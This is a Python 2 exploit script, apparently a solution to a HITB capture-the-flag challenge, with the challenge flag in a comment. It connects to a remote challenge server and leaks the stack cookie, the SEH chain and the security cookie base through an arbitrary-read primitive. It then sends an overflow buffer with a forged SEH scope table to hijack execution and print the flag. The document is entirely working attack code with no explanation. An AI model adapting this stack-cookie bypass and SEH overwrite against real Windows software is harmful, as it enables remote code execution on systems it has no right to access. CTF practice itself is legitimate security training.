from socket import socket
from re import findall
import struct
import sys

# hitb{W0W_y0u_kn0w_sc0p3_t4b13}

def recv_until(s, until):
	data = ""
	while data.find(until) < 0:
		c = s.recv(1)
		data += c
	print data
	return data

def parse_hex(prefix, data):
	return [int(a, 0) for a in findall(prefix + "(0x[0-9a-f]+)", data)]

def sendit(s, st):
	print st,
	s.sendall(st)

def abs_read(s, addr):
	sendit(s, "yes\n")
	recv_until(s, "know")

	sendit(s, str(addr) + "\n")
	data = recv_until(s, "?")
	return parse_hex("is ", data)[0]

s = socket()
s.settimeout(5.0)

s.connect(("47.74.133.139", 20004))
# s.connect(("127.0.0.1", 1337))

data = recv_until(s, "?")
stack, main = parse_hex("address = ", data)
print "stack is at 0x{}\nmain  is at 0x{}".format(hex(stack)[2:].zfill(8), hex(main)[2:].zfill(8))

scope_table = [0xffffffe4, 0, 0xffffff20, 0, 0xfffffffe, main + 0x2dd, main + 0x2dd, 0]
scope_table = "".join(struct.pack("<I", i) for i in scope_table)
scope_table_addr = stack + 0x20
assert len(scope_table) == 0x20

raw_input("Any key...")

cookie = abs_read(s, stack + 0x80)
print "Stack cookie is 0x{}".format(hex(cookie)[2:].zfill(8))

fubar1 = abs_read(s, stack + 0x84)
print "fubar1 is 0x{}".format(hex(fubar1)[2:].zfill(8))

fubar2 = abs_read(s, stack + 0x88)
print "fubar2 is 0x{}".format(hex(fubar2)[2:].zfill(8))

sehnext = abs_read(s, stack + 0x8c)
print "SEH next is 0x{}".format(hex(sehnext)[2:].zfill(8))

ebp = abs_read(s, stack + 0x9c)
print "ebp is 0x{}".format(hex(ebp)[2:].zfill(8))

cookie_base = abs_read(s, main + 0x2f54)
print "Security cookie base is 0x{}".format(hex(cookie_base)[2:].zfill(8))

scope_table_addr ^= cookie_base

buff = ("A" * 0x20) + scope_table + ("A" * 0x40) + struct.pack("<IIIIIIII", \
	cookie, fubar1, fubar2, sehnext, main + 0x3b0, scope_table_addr, 0, ebp)
assert len(buff) < 0x100
assert buff[-1] == "\x00"
buff = buff[:-1] + "\n"
assert buff.find("\n") == len(buff) - 1

sendit(s, "nah\n")
print "Buffer ({}):".format(hex(len(buff))), repr(buff)
sendit(s, buff)

recv_until(s, "?")
sendit(s, "yes\n")
recv_until(s, "know")
sendit(s, "0\n")

print s.recv(4096)

sendit(s, "type flag\n")

try:
	while True:
		d = s.recv(4096)
		if len(d) == 0:
			break
		sys.stdout.write(d)
except:
	pass

s.close()
